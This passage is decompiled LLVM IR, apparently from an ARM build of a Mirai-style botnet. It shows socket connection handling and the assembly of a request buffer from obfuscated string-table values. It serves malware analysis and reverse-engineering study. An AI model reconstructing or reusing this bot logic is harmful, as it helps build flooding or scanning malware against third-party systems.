  %v5_86b4 = call i32 @__GI_setsockopt(i32 %v3_8698, i32 %v0_869c, i32 8, i32 %v2_86ac, i32 4)
  store i32 %v5_86b4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-20864.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v1_9e84, i32* %r2.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r6, align 4
  %v1_86c0 = add i32 %v0_86c0, -1436
  %v2_86c0 = inttoptr i32 %v1_86c0 to i32*
  %v3_86c0 = load i32, i32* %v2_86c0, align 4
  store i32 %v3_86c0, i32* @r4, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_86cc, i32* %r3.global-to-local, align 4
  %v1_86d0 = add i32 %v0_86c0, -1452
  %v2_86d0 = inttoptr i32 %v1_86d0 to i32*
  %v3_86d0 = load i32, i32* %v2_86d0, align 4
  store i32 %v3_86d0, i32* %r0.global-to-local, align 4
  %v3_86e0 = add i32 %v0_86c0, -1448
  %v4_86e0 = inttoptr i32 %v3_86e0 to i8*
  store i8 2, i8* %v4_86e0, align 1
  store i32 %v2_8530, i32* %r3.global-to-local, align 4
  %v0_86ec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_86ec, i32* %stack_var_-76, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v2_86f4, i32* %r1.global-to-local, align 4
  %v1_86f8 = load i32, i32* @r6, align 4
  %v2_86f8 = add i32 %v1_86f8, -1444
  %v3_86f8 = inttoptr i32 %v2_86f8 to i32*
  store i32 %v2_8530, i32* %v3_86f8, align 4
  %v3_86fc = call i32 @__libc_connect(i32 %v3_86d0, i32 %v2_86f4, i32 16)
  store i32 %v3_86fc, i32* %r0.global-to-local, align 4
  %v0_8700 = load i32, i32* @r6, align 4
  %v1_8700 = add i32 %v0_8700, -1452
  %v2_8700 = inttoptr i32 %v1_8700 to i32*
  %v3_8700 = load i32, i32* %v2_8700, align 4
  store i32 %v3_8700, i32* %ip.global-to-local, align 4
  %v3_8708 = udiv i32 %v3_8700, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_870c = mul nuw nsw i32 %v3_8708, 4
  store i32 %v3_870c, i32* %r2.global-to-local, align 4
  store i32 %v2_8710, i32* @lr, align 4
  br label %dec_label_pc_8718

dec_label_pc_8718:                                ; preds = %dec_label_pc_8d00, %dec_label_pc_866c
  %v0_8728 = phi i32 [ %v3_8700, %dec_label_pc_866c ], [ %v3_8d00, %dec_label_pc_8d00 ]
  %v3_870c.pn = phi i32 [ %v3_870c, %dec_label_pc_866c ], [ %v3_8d0c, %dec_label_pc_8d00 ]
  %storemerge = add i32 %v3_870c.pn, %v2_8710
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_8718 = add i32 %storemerge, -292
  %v2_8718 = inttoptr i32 %v1_8718 to i32*
  %v3_8718 = load i32, i32* %v2_8718, align 4
  %v1_871c = urem i32 %v0_8728, 32
  store i32 %v1_871c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8724 = shl i32 1, %v1_871c
  %v8_8724 = or i32 %v3_8718, %v7_8724
  store i32 %v8_8724, i32* @r1, align 4
  %v1_8728 = load i32, i32* @r8, align 4
  %v2_8728 = sub i32 %v0_8728, %v1_8728
  %v3_8728 = icmp uge i32 %v0_8728, %v1_8728
  store i1 %v3_8728, i1* %cpsr_c.global-to-local, align 1
  %v4_8728 = xor i32 %v1_8728, %v0_8728
  %v5_8728 = xor i32 %v2_8728, %v0_8728
  %v6_8728 = and i32 %v5_8728, %v4_8728
  %v7_8728 = icmp slt i32 %v6_8728, 0
  %v8_8728 = icmp slt i32 %v2_8728, 0
  %v9_8728 = icmp eq i32 %v0_8728, %v1_8728
  store i1 %v9_8728, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8724, i32* %v2_8718, align 4
  %v3_8730 = xor i1 %v8_8728, %v7_8728
  %v4_8730 = or i1 %v9_8728, %v3_8730
  br i1 %v4_8730, label %dec_label_pc_85f4, label %dec_label_pc_8734

dec_label_pc_8734:                                ; preds = %dec_label_pc_8718
  %v0_8734 = load i32, i32* %ip.global-to-local, align 4
  %v1_8734 = load i32, i32* %r3.global-to-local, align 4
  %v2_8734 = add i32 %v1_8734, %v0_8734
  store i32 %v2_8734, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8738:                                ; preds = %dec_label_pc_8fe0, %dec_label_pc_8f8c, %dec_label_pc_8d50, %dec_label_pc_8734
  %v0_875065 = phi i32 [ %v2_8fe0, %dec_label_pc_8fe0 ], [ %v2_8f8c, %dec_label_pc_8f8c ], [ %v2_8d50, %dec_label_pc_8d50 ], [ %v2_8734, %dec_label_pc_8734 ]
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_873c = load i32, i32* @r7, align 4
  %v1_873c = add i32 %v0_873c, 1
  store i32 %v1_873c, i32* @r7, align 4
  %v0_8740 = load i32, i32* @r6, align 4
  %v3_8744 = icmp uge i32 %v1_873c, %v0_839c
  store i1 %v3_8744, i1* %cpsr_c.global-to-local, align 1
  %v9_8744 = icmp eq i32 %v1_873c, %v0_839c
  store i1 %v9_8744, i1* %cpsr_z.global-to-local, align 1
  %v1_8748 = add i32 %v0_8740, 3140
  store i32 %v1_8748, i32* @r6, align 4
  br i1 %v9_8744, label %dec_label_pc_8750, label %dec_label_pc_860c

dec_label_pc_8750:                                ; preds = %dec_label_pc_8738, %dec_label_pc_85f4.dec_label_pc_8750_crit_edge
  %v0_8788 = phi i32 [ %v0_8750.pre, %dec_label_pc_85f4.dec_label_pc_8750_crit_edge ], [ %v0_875065, %dec_label_pc_8738 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8750 = icmp eq i32 %v0_8788, 0
  store i1 %v2_8750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8750, label %dec_label_pc_852c, label %dec_label_pc_8758

dec_label_pc_8758:                                ; preds = %dec_label_pc_8750
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-60, align 4
  store i32 %v2_8778, i32* %ip.global-to-local, align 4
  store i32 %v2_877c, i32* %r1.global-to-local, align 4
  store i32 %v2_8780, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_8788, i32* %r0.global-to-local, align 4
  %v5_8790 = call i32 @__libc_select(i32 %v0_8788, i32 %v2_877c, i32 %v2_8780, i32 0, i32 %v2_8778)
  store i32 %v5_8790, i32* @r4, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  store i32 %v0_8798, i32* %r0.global-to-local, align 4
  %v1_879c = inttoptr i32 %v0_8798 to i32*
  %v2_879c = call i32 @__GI_time(i32* %v1_879c)
  store i32 %v2_879c, i32* %r0.global-to-local, align 4
  %v0_87a0 = load i32, i32* @r4, align 4
  %v1_87a0 = load i32, i32* @r5, align 4
  %v3_87a0 = icmp uge i32 %v0_87a0, %v1_87a0
  store i1 %v3_87a0, i1* %cpsr_c.global-to-local, align 1
  %v9_87a0 = icmp eq i32 %v0_87a0, %v1_87a0
  store i1 %v9_87a0, i1* %cpsr_z.global-to-local, align 1
  %v7_87a8 = icmp sgt i32 %v0_87a0, %v1_87a0
  br i1 %v7_87a8, label %dec_label_pc_87ac, label %dec_label_pc_852c

dec_label_pc_87ac:                                ; preds = %dec_label_pc_8758
  %v0_880c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_880c

dec_label_pc_87b4:                                ; preds = %dec_label_pc_8820, %dec_label_pc_888c
  %v1_87c4 = phi i32 [ %v1_8838, %dec_label_pc_8820 ], [ %v1_87c4.pre, %dec_label_pc_888c ]
  %v0_87bc = phi i32 [ %v3_8828, %dec_label_pc_8820 ], [ %v0_87bc.pre, %dec_label_pc_888c ]
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  %v2_87bc = add i32 %v0_87bc, %v2_8710
  store i32 %v2_87bc, i32* %r2.global-to-local, align 4
  %v1_87c0 = add i32 %v2_87bc, -164
  %v2_87c0 = inttoptr i32 %v1_87c0 to i32*
  %v3_87c0 = load i32, i32* %v2_87c0, align 4
  %v2_87c4 = add i32 %v1_87c4, -1
  %v3_87c4 = shl i32 1, %v2_87c4
  %v4_87c4 = and i32 %v3_87c0, %v3_87c4
  %v5_87c4 = icmp ne i32 %v4_87c4, 0
  store i1 %v5_87c4, i1* %cpsr_c.global-to-local, align 1
  %v6_87c4 = ashr i32 %v3_87c0, %v1_87c4
  store i32 %v6_87c4, i32* %r3.global-to-local, align 4
  %v1_87c8 = urem i32 %v6_87c4, 2
  %v2_87c8 = icmp eq i32 %v1_87c8, 0
  store i1 %v2_87c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_87c8, label %dec_label_pc_87ec, label %dec_label_pc_87d0

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87b4
  %v0_87d0 = load i32, i32* @sl, align 4
  %v1_87d0 = add i32 %v0_87d0, -1448
  %v2_87d0 = inttoptr i32 %v1_87d0 to i8*
  %v3_87d0 = load i8, i8* %v2_87d0, align 1
  %v4_87d0 = zext i8 %v3_87d0 to i32
  store i32 %v4_87d0, i32* %r3.global-to-local, align 4
  %v2_87d4 = icmp ugt i8 %v3_87d0, 5
  store i1 %v2_87d4, i1* %cpsr_c.global-to-local, align 1
  %v7_87d4 = icmp eq i8 %v3_87d0, 6
  store i1 %v7_87d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87d4, label %dec_label_pc_9028, label %dec_label_pc_87dc

dec_label_pc_87dc:                                ; preds = %dec_label_pc_87d0
  %v2_87dc = icmp ugt i8 %v3_87d0, 6
  store i1 %v2_87dc, i1* %cpsr_c.global-to-local, align 1
  %v7_87dc = icmp eq i8 %v3_87d0, 7
  store i1 %v7_87dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87dc, label %dec_label_pc_8d58, label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87dc
  %v2_87e4 = icmp ugt i8 %v3_87d0, 9
  store i1 %v2_87e4, i1* %cpsr_c.global-to-local, align 1
  %v7_87e4 = icmp eq i8 %v3_87d0, 10
  store i1 %v7_87e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87e4, label %dec_label_pc_9660, label %dec_label_pc_87ec

dec_label_pc_87ec:                                ; preds = %dec_label_pc_8e58, %dec_label_pc_96f0, %dec_label_pc_96a0, %dec_label_pc_9078, %dec_label_pc_87e4, %dec_label_pc_87b4, %dec_label_pc_880c, %dec_label_pc_9b40, %dec_label_pc_99ec, %dec_label_pc_9974, %dec_label_pc_9918, %dec_label_pc_96fc, %dec_label_pc_96cc, %dec_label_pc_96b0, %dec_label_pc_9654, %dec_label_pc_9550, %dec_label_pc_8f94
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_87f4 = add i32 %stack_var_-20820.0, 1
  store i32 %v1_87f4, i32* %r2.global-to-local, align 4
  %v0_87f8 = load i32, i32* @sl, align 4
  %v3_87fc = icmp uge i32 %v1_87f4, %v0_839c
  store i1 %v3_87fc, i1* %cpsr_c.global-to-local, align 1
  %v9_87fc = icmp eq i32 %v1_87f4, %v0_839c
  store i1 %v9_87fc, i1* %cpsr_z.global-to-local, align 1
  %v1_8804 = add i32 %v0_87f8, 3140
  store i32 %v1_8804, i32* @sl, align 4
  br i1 %v9_87fc, label %dec_label_pc_852c, label %dec_label_pc_880c

dec_label_pc_880c:                                ; preds = %dec_label_pc_87ec, %dec_label_pc_87ac
  %v0_880c = phi i32 [ %v0_880c.pre, %dec_label_pc_87ac ], [ %v1_8804, %dec_label_pc_87ec ]
  %stack_var_-20820.0 = phi i32 [ %v1_87a0, %dec_label_pc_87ac ], [ %v1_87f4, %dec_label_pc_87ec ]
  %v1_880c = add i32 %v0_880c, -1452
  %v2_880c = inttoptr i32 %v1_880c to i32*
  %v3_880c = load i32, i32* %v2_880c, align 4
  store i32 %v3_880c, i32* %r0.global-to-local, align 4
  %v2_8814 = icmp eq i32 %v3_880c, -1
  store i1 %v2_8814, i1* %cpsr_c.global-to-local, align 1
  %v7_8814 = icmp eq i32 %v3_880c, -1
  store i1 %v7_8814, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_880c, i32* %sb.global-to-local, align 4
  br i1 %v7_8814, label %dec_label_pc_87ec, label %dec_label_pc_8820

dec_label_pc_8820:                                ; preds = %dec_label_pc_880c
  %v3_8820 = udiv i32 %v3_880c, 32
  %v3_8828 = mul nuw nsw i32 %v3_8820, 4
  store i32 %v3_8828, i32* @ip, align 4
  store i32 %v2_8710, i32* @lr, align 4
  %v2_8830 = add i32 %v3_8828, %v2_8710
  store i32 %v2_8830, i32* %r2.global-to-local, align 4
  %v1_8834 = add i32 %v2_8830, -292
  %v2_8834 = inttoptr i32 %v1_8834 to i32*
  %v3_8834 = load i32, i32* %v2_8834, align 4
  %v1_8838 = urem i32 %v3_880c, 32
  store i32 %v1_8838, i32* %r1.global-to-local, align 4
  %v2_883c = add nsw i32 %v1_8838, -1
  %v3_883c = shl i32 1, %v2_883c
  %v4_883c = and i32 %v3_8834, %v3_883c
  %v5_883c = icmp ne i32 %v4_883c, 0
  store i1 %v5_883c, i1* %cpsr_c.global-to-local, align 1
  %v6_883c = ashr i32 %v3_8834, %v1_8838
  store i32 %v6_883c, i32* %r3.global-to-local, align 4
  %v1_8840 = urem i32 %v6_883c, 2
  %v2_8840 = icmp eq i32 %v1_8840, 0
  store i1 %v2_8840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8840, label %dec_label_pc_87b4, label %dec_label_pc_8848

dec_label_pc_8848:                                ; preds = %dec_label_pc_8820
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_8860, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 4, i32* %stack_var_-52, align 4
  store i32 %v2_886c, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_8878 = call i32 @getsockopt(i32 %v3_880c, i32 1, i32 4, i32 %v2_8860, i32 %v2_886c)
  store i32 %v10_82f0, i32* @r1, align 4
  %v3_8880 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_8880, i32* %r3.global-to-local, align 4
  %v2_8884 = or i32 %v3_8880, %v5_8878
  store i32 %v2_8884, i32* %r0.global-to-local, align 4
  %v4_8884 = icmp eq i32 %v2_8884, 0
  store i1 %v4_8884, i1* %cpsr_z.global-to-local, align 1
  %v0_888c = load i32, i32* @sl, align 4
  %v1_888c = add i32 %v0_888c, -1452
  %v2_888c = inttoptr i32 %v1_888c to i32*
  %v3_888c = load i32, i32* %v2_888c, align 4
  br i1 %v4_8884, label %dec_label_pc_888c, label %dec_label_pc_8f94

dec_label_pc_888c:                                ; preds = %dec_label_pc_8848
  store i32 %v3_888c, i32* %r3.global-to-local, align 4
  %v3_8890 = udiv i32 %v3_888c, 32
  store i32 %v3_8890, i32* %r2.global-to-local, align 4
  %v1_8894 = urem i32 %v3_888c, 32
  store i32 %v1_8894, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8898 = mul nuw nsw i32 %v3_8890, 4
  store i32 %v3_8898, i32* @ip, align 4
  %v0_889c = load i32, i32* @r4, align 4
  %v1_889c = trunc i32 %v0_889c to i8
  %v3_889c = add i32 %v0_888c, -1448
  %v4_889c = inttoptr i32 %v3_889c to i8*
  store i8 %v1_889c, i8* %v4_889c, align 1
  %v0_87bc.pre = load i32, i32* @ip, align 4
  %v1_87c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_87b4

dec_label_pc_88a4:                                ; preds = %dec_label_pc_860c
  %v1_88a4 = add i32 %v3_88b0, 4
  %v2_88a4 = inttoptr i32 %v1_88a4 to i32*
  %v3_88a4 = load i32, i32* %v2_88a4, align 4
  store i32 %v3_88a4, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_88a8 = icmp eq i32 %v3_88a4, 0
  store i1 %v2_88a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_88a8, label %.thread19, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_88a4
  store i32 4, i32* @r3, align 4
  store i8 4, i8* %v2_860c, align 1
  %v0_88b4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_88b4.pr.pr, label %.thread17..thread19_crit_edge, label %dec_label_pc_88bc

.thread17..thread19_crit_edge:                    ; preds = %.thread17
  %v1_88b4.pre = load i32, i32* @r3, align 4
  %v3_88b4.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_88b4.pre to i8
  br label %.thread19

.thread19:                                        ; preds = %.thread17..thread19_crit_edge, %dec_label_pc_88a4
  %v3_88b4 = phi i32 [ %v3_88b4.pre, %.thread17..thread19_crit_edge ], [ %v3_88b0, %dec_label_pc_88a4 ]
  %v1_88b4.off0 = phi i8 [ %extract.t, %.thread17..thread19_crit_edge ], [ 0, %dec_label_pc_88a4 ]
  %v4_88b4 = add i32 %v3_88b4, -1448
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 %v1_88b4.off0, i8* %v5_88b4, align 1
  %v0_88b8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_88b8.pr, label %.thread19.dec_label_pc_8628_crit_edge, label %dec_label_pc_88bc

.thread19.dec_label_pc_8628_crit_edge:            ; preds = %.thread19
  %v0_8628.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8628

dec_label_pc_88bc:                                ; preds = %.thread17, %dec_label_pc_85b4, %.thread19
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  %v0_88c4 = load i32, i32* @r5, align 4
  %v1_88c4 = add i32 %v0_88c4, 2112
  store i32 %v1_88c4, i32* %r0.global-to-local, align 4
  %v1_88c8 = load i32, i32* @r6, align 4
  %v2_88c8 = add i32 %v1_88c8, 12
  %v3_88c8 = inttoptr i32 %v2_88c8 to i32*
  store i32 -1, i32* %v3_88c8, align 4
  %v0_88cc = load i32, i32* %r0.global-to-local, align 4
  %v1_88cc = add i32 %v0_88cc, 4
  store i32 %v1_88cc, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_88d4 = load i32, i32* %sb.global-to-local, align 4
  %v1_88d4 = load i32, i32* @r6, align 4
  %v2_88d4 = inttoptr i32 %v1_88d4 to i32*
  store i32 %v0_88d4, i32* %v2_88d4, align 4
  %v2_88d8 = call i32 @util_zero(i32 %v1_88cc, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_88e4 = load i32, i32* %sb.global-to-local, align 4
  %v1_88e4 = load i32, i32* @r6, align 4
  %v2_88e4 = add i32 %v1_88e4, 660
  %v3_88e4 = inttoptr i32 %v2_88e4 to i32*
  store i32 %v0_88e4, i32* %v3_88e4, align 4
  %v2_88e8 = call i32 @util_zero(i32 %stack_var_-20860.0.ph, i32 10240)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88f0 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_88f4 = load i32, i32* @r5, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_88fc = add i32 %v0_88f4, 1431
  store i32 %v1_88fc, i32* %fp.global-to-local, align 4
  %v2_8900 = add i32 %v2_88f0, %stack_var_-20860.0.ph
  store i32 %v2_8900, i32* @r0, align 4
  store i32 %v1_88fc, i32* %r1.global-to-local, align 4
  %v2_8908 = inttoptr i32 %v2_8900 to i8*
  %v3_8908 = call i32 @util_strcpy(i8* %v2_8908, i32 %v1_88fc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8910 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1a780.37 to i32), i32* %r1.global-to-local, align 4
  %v2_891c = add i32 %v2_8910, %stack_var_-20860.0.ph
  store i32 %v2_891c, i32* @r0, align 4
  %v2_8920 = inttoptr i32 %v2_891c to i8*
  %v3_8920 = call i32 @util_strcpy(i8* %v2_8920, i32 ptrtoint (i32* @global_var_1a780.37 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8928 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8930 = add i32 %v2_8928, %stack_var_-20860.0.ph
  store i32 %v2_8930, i32* @r0, align 4
  %v0_8934 = load i32, i32* @r5, align 4
  %v1_8934 = add i32 %v0_8934, 532
  store i32 %v1_8934, i32* %r1.global-to-local, align 4
  %v2_8938 = inttoptr i32 %v2_8930 to i8*
  %v3_8938 = call i32 @util_strcpy(i8* %v2_8938, i32 %v1_8934)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8940 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1a758.39 to i32), i32* %r1.global-to-local, align 4
  %v2_894c = add i32 %v2_8940, %stack_var_-20860.0.ph
  store i32 %v2_894c, i32* @r0, align 4
  %v3_8950 = inttoptr i32 %v2_894c to i8*
  %v4_8950 = call i32 @util_strcpy(i8* %v3_8950, i32 ptrtoint ([24 x i8]* @global_var_1a758.39 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8958 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v1_8960 = add i32 %v0_8960, 20
  store i32 %v1_8960, i32* %r1.global-to-local, align 4
  %v2_8964 = add i32 %v2_8958, %stack_var_-20860.0.ph
  store i32 %v2_8964, i32* @r0, align 4
  %v2_8968 = inttoptr i32 %v2_8964 to i8*
  %v3_8968 = call i32 @util_strcpy(i8* %v2_8968, i32 %v1_8960)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8970 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a770.41 to i32), i32* %r1.global-to-local, align 4
  %v2_897c = add i32 %v2_8970, %stack_var_-20860.0.ph
  store i32 %v2_897c, i32* @r0, align 4
  %v3_8980 = inttoptr i32 %v2_897c to i8*
  %v4_8980 = call i32 @util_strcpy(i8* %v3_8980, i32 ptrtoint ([9 x i8]* @global_var_1a770.41 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8988 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  %v0_8990 = load i32, i32* @r5, align 4
  %v2_8994 = add i32 %v2_8988, %stack_var_-20860.0.ph
  store i32 %v2_8994, i32* @r0, align 4
  %v1_8998 = add i32 %v0_8990, 789
  store i32 %v1_8998, i32* %r1.global-to-local, align 4
  %v2_899c = inttoptr i32 %v2_8994 to i8*
  %v3_899c = call i32 @util_strcpy(i8* %v2_899c, i32 %v1_8998)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89a4 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_89ac = add i32 %v2_89a4, %stack_var_-20860.0.ph
  store i32 %v2_89ac, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  %v3_89b4 = inttoptr i32 %v2_89ac to i8*
  %v4_89b4 = call i32 @util_strcpy(i8* %v3_89b4, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32))
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_89bc = call i32 @table_unlock_val(i32 39)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89c4 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_89c8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_89c8, i32* %r1.global-to-local, align 4
  store i32 %v2_89c4, i32* @r4, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_89d4 = inttoptr i32 %v0_89c8 to i32*
  %v3_89d4 = call i32 @table_retrieve_val(i32 39, i32* %v2_89d4)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_89d4, i32* %r1.global-to-local, align 4
  %v1_89e0 = load i32, i32* @r4, align 4
  %v2_89e0 = add i32 %v1_89e0, %stack_var_-20860.0.ph
  store i32 %v2_89e0, i32* @r0, align 4
  %v2_89e4 = inttoptr i32 %v2_89e0 to i8*
  %v3_89e4 = call i32 @util_strcpy(i8* %v2_89e4, i32 %v3_89d4)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_89ec = call i32 @table_lock_val(i32 39)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89f4 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8a00 = add i32 %v2_89f4, %stack_var_-20860.0.ph
  store i32 %v2_8a00, i32* @r0, align 4
  %v3_8a04 = inttoptr i32 %v2_8a00 to i8*
  %v4_8a04 = call i32 @util_strcpy(i8* %v3_8a04, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32))
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8a0c = call i32 @table_unlock_val(i32 40)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a14 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8a18 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a18, i32* %r1.global-to-local, align 4
  store i32 %v2_8a14, i32* @r4, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_8a24 = inttoptr i32 %v0_8a18 to i32*
  %v3_8a24 = call i32 @table_retrieve_val(i32 40, i32* %v2_8a24)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_8a24, i32* %r1.global-to-local, align 4
  %v1_8a30 = load i32, i32* @r4, align 4
  %v2_8a30 = add i32 %v1_8a30, %stack_var_-20860.0.ph
  store i32 %v2_8a30, i32* @r0, align 4
  %v2_8a34 = inttoptr i32 %v2_8a30 to i8*
  %v3_8a34 = call i32 @util_strcpy(i8* %v2_8a34, i32 %v3_8a24)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8a3c = call i32 @table_lock_val(i32 40)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a44 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8a50 = add i32 %v2_8a44, %stack_var_-20860.0.ph
  store i32 %v2_8a50, i32* @r0, align 4
  %v3_8a54 = inttoptr i32 %v2_8a50 to i8*
  %v4_8a54 = call i32 @util_strcpy(i8* %v3_8a54, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32))
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_8a5c = call i32 @table_unlock_val(i32 41)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a64 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8a68 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a68, i32* %r1.global-to-local, align 4
  store i32 %v2_8a64, i32* @r4, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_8a74 = inttoptr i32 %v0_8a68 to i32*
  %v3_8a74 = call i32 @table_retrieve_val(i32 41, i32* %v2_8a74)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8a74, i32* %r1.global-to-local, align 4
  %v1_8a80 = load i32, i32* @r4, align 4
  %v2_8a80 = add i32 %v1_8a80, %stack_var_-20860.0.ph
  store i32 %v2_8a80, i32* @r0, align 4
  %v2_8a84 = inttoptr i32 %v2_8a80 to i8*
  %v3_8a84 = call i32 @util_strcpy(i8* %v2_8a84, i32 %v3_8a74)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_8a8c = call i32 @table_lock_val(i32 41)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a94 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8aa0 = add i32 %v2_8a94, %stack_var_-20860.0.ph
  store i32 %v2_8aa0, i32* @r0, align 4
  %v3_8aa4 = inttoptr i32 %v2_8aa0 to i8*
  %v4_8aa4 = call i32 @util_strcpy(i8* %v3_8aa4, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32))
  store i32 %v4_8aa4, i32* %r0.global-to-local, align 4
  store i32 %v6_81fc, i32* %ip.global-to-local, align 4
  %v1_8aac = load i32, i32* %sb.global-to-local, align 4
